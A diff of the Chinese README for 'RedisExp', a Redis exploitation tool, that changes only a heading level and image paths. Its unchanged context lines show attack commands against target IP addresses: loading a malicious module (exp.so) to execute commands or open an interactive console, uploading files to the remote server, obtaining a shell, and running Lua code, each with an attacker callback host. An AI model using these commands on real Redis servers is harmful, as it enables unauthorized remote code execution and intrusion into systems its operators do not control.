@@ -1,4 +1,4 @@
-### Redis 漏洞利用工具
+## Redis 漏洞利用工具
 
 帮助：`-h`
 
@@ -46,7 +46,7 @@ RedisExp.exe -rhost 192.168.211.130 -lhost 192.168.211.1 -so exp.so -exec -c who
 RedisExp.exe -rhost 192.168.211.130 -lhost 192.168.211.1 -so exp.so -exec -console
 ````
 
-![1](images\1.png)
+![1](images/1.png)
 
 文件上传：
 
@@ -54,7 +54,7 @@ RedisExp.exe -rhost 192.168.211.130 -lhost 192.168.211.1 -so exp.so -exec -conso
 RedisExp.exe -rhost 192.168.211.128 -lhost 192.168.211.1 -upload -rfile 1.txt -lfile 2.txt
 ```
 
-![2](images\2.png)
+![2](images/2.png)
 
 
 
@@ -64,7 +64,7 @@ RedisExp.exe -rhost 192.168.211.128 -lhost 192.168.211.1 -upload -rfile 1.txt -l
 RedisExp.exe -rhost 192.168.211.128 -lhost 192.168.211.1 -shell
 ```
 
-![3](images\3.png)
+![3](images/3.png)
 
 
 
@@ -74,7 +74,7 @@ RedisExp.exe -rhost 192.168.211.128 -lhost 192.168.211.1 -shell
 RedisExp.exe -rhost 192.168.211.130 -lhost 192.168.211.1 -lua -console
 ```
 
-![4](images\4.png)
+![4](images/4.png)
 
 
 
